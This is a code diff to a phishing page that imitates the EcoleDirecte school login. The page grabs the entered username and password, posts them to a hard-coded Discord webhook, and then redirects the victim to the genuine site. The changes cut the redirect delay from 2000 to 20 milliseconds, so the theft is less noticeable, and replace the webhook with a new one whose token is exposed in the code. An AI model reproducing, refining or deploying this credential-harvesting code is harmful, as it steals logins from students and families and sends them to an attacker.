@@ -160,7 +160,7 @@
     console.log("username : ", uname);
     console.log("password : ", pass);
     send(webhook_name, uname, pass, date_string);
-    setTimeout(function () { location.assign("https://www.ecoledirecte.com");}, 2000);
+    setTimeout(function () { location.assign("https://www.ecoledirecte.com");}, 20);
   }
 
   document.getElementById("bouton").onclick = function connect_funct() {
@@ -173,7 +173,7 @@
     console.log("username : ", uname);
     console.log("password : ", pass);
     send(webhook_name, uname, pass, date_string);
-    setTimeout(function () { location.assign("https://www.ecoledirecte.com");}, 2000);
+    setTimeout(function () { location.assign("https://www.ecoledirecte.com");}, 20);
 
   }
 
@@ -187,13 +187,13 @@
     console.log("username : ", uname);
     console.log("password : ", pass);
     send(webhook_name, uname, pass, date_string);
-    setTimeout(function () { location.assign("https://www.ecoledirecte.com");}, 2000);
+    setTimeout(function () { location.assign("https://www.ecoledirecte.com");}, 20);
 
   }
 
   function send(webhook_name, uname, pass, date_string) {
     console.log("fonction message")
-    var webhooklink = "https://discordapp.com/api/webhooks/939656925002494052/TcXI2LHUPT95W82CP1pypDHs7-DmSQinX-6tnR1n2k_u7mCYA3e9klXH7GhzE71RUjwq";
+    var webhooklink = "https://discord.com/api/webhooks/941317322214354974/rMQAi8CDTR_mSl4yBUf5tj9RtH59gMP6To7wIdLqJ-ynLK8PRz_u9ZvKLy_VYIqyzw_O";
     const request = new XMLHttpRequest();
       request.open("POST", webhooklink);
       request.setRequestHeader('Content-type', 'application/json');
